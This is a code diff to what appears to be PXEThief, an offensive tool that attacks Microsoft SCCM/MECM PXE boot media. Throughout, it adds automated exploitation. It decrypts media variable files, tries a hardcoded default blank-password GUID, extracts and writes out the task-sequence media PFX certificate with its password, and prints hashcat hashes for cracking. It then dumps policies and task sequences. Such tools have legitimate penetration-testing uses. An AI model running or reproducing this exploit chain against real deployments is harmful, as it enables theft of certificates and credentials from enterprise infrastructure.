@@ -452,6 +452,23 @@ def get_variable_file_path(tftp_server):
     else:
         return [variables_file, bcd_file]
 
+def auto_exploit_media_variables(var_file_name, media_variables):
+    """Common exploit chain: extract PFX from decrypted media variables, dump policies and task sequences."""
+    warning("Writing media variables to [bold]variables.xml[/]")
+    write_to_file("variables", media_variables)
+
+    root = ET.fromstring(media_variables.encode("utf-16-le"))
+    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
+    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
+    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
+    filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
+
+    warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
+    write_to_binary_file(filename, smsTSMediaPFX)
+    auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)
+
+    process_pxe_bootable_and_prestaged_media(media_variables)
+
 def get_pxe_files(ip):
     if ip != None:
         info(f"Targeting user-specified host: [bold]{ip}[/]")
@@ -485,26 +502,27 @@ def get_pxe_files(ip):
     except Exception as e:
         warning(f"Failed to download BCD file: {e}")
 
+    # Print hashcat hash
+    try:
+        hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
+        found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
+    except Exception:
+        pass
+
     if BLANK_PASSWORDS_FOUND:
-        config = configparser.ConfigParser(allow_no_value=True)
-        config.read('settings.ini')
-        general_config = config["GENERAL SETTINGS"]
-        auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
-        if auto_exploit_blank_password:
-            warning("Attempting automatic exploitation...")
-            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
-            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
-            use_encrypted_key(encrypted_key, var_file_name)
-        else:
-            warning("Change [bold]auto_exploit_blank_password[/] in settings.ini to 1 to attempt exploitation")
+        warning("Blank password — exploiting via DHCP encrypted key...")
+        use_encrypted_key(encrypted_key, var_file_name)
     else:
-        info("User configured password detected for task sequence media")
+        # Try default MECM blank password first
+        default_password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
+        info("Trying default MECM blank password...")
         try:
-            hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
-            found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
+            media_variables = decrypt_media_file(var_file_name, default_password, silent=True)
+            found("[bold green]Default blank password worked![/]")
+            auto_exploit_media_variables(var_file_name, media_variables)
         except Exception:
-            pass
-        info("Crack with hashcat using the SCCM module, then run: [bold]pxethief.py 3 <file> <cracked-password>[/]")
+            info("Default password failed — password is user-configured")
+            info("Crack with hashcat, then run: [bold]pxethief.py 3 <file> <cracked-password>[/]")
 
 def generateSignedData(data, private_key):
     signature = private_key.sign(
@@ -531,13 +549,14 @@ def deobfuscate_credential_string(credential_string):
     last_16 = math.floor(len(encrypted_data)/8)*8
     return media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
 
-def decrypt_media_file(path, password):
+def decrypt_media_file(path, password, silent=False):
     password_is_string = isinstance(password, str)
-    info(f"Media variables file: [bold]{path}[/]")
-    if password_is_string:
-        info(f"Password: [bold]{password}[/]")
-    else:
-        info(f"Password bytes: [bold]0x{password.hex()}[/]")
+    if not silent:
+        info(f"Media variables file: [bold]{path}[/]")
+        if password_is_string:
+            info(f"Password: [bold]{password}[/]")
+        else:
+            info(f"Password bytes: [bold]0x{password.hex()}[/]")
 
     encrypted_file = media_crypto.read_media_variable_file(path)
     try:
@@ -552,8 +571,11 @@ def decrypt_media_file(path, password):
             decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16], key[:32])
         decrypted_media_file = decrypted_media_file[:decrypted_media_file.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
-        success("Successfully decrypted media variables file!")
+        if not silent:
+            success("Successfully decrypted media variables file!")
     except Exception as e:
+        if silent:
+            raise
         error(f"Failed to decrypt media variables file — check the password")
         error(f"  {e}")
         sys.exit(-1)
@@ -616,21 +638,7 @@ def use_encrypted_key(encrypted_key, media_file_path):
             new_key = new_key + byte + b'\x00'
 
     media_variables = decrypt_media_file(media_file_path, new_key)
-
-    warning("Writing media variables to [bold]variables.xml[/]")
-    write_to_file("variables", media_variables)
-
-    root = ET.fromstring(media_variables.encode("utf-16-le"))
-    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
-    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
-    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
-    filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
-
-    warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
-    write_to_binary_file(filename, smsTSMediaPFX)
-    auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)
-
-    process_pxe_bootable_and_prestaged_media(media_variables)
+    auto_exploit_media_variables(media_file_path, media_variables)
 
 def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
     smsMediaGuid = guid
@@ -1014,20 +1022,7 @@ if __name__ == "__main__":
 
         path = sys.argv[2]
         media_variables = decrypt_media_file(path, password)
-        warning("Writing media variables to [bold]variables.xml[/]")
-        write_to_file("variables", media_variables)
-
-        root = ET.fromstring(media_variables.encode("utf-16-le"))
-        smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
-        smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
-        smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
-        filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"
-
-        warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
-        write_to_binary_file(filename, smsTSMediaPFX)
-        auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)
-
-        process_pxe_bootable_and_prestaged_media(media_variables)
+        auto_exploit_media_variables(path, media_variables)
 
     elif int(sys.argv[1]) == 4:
         console.print(BANNER)
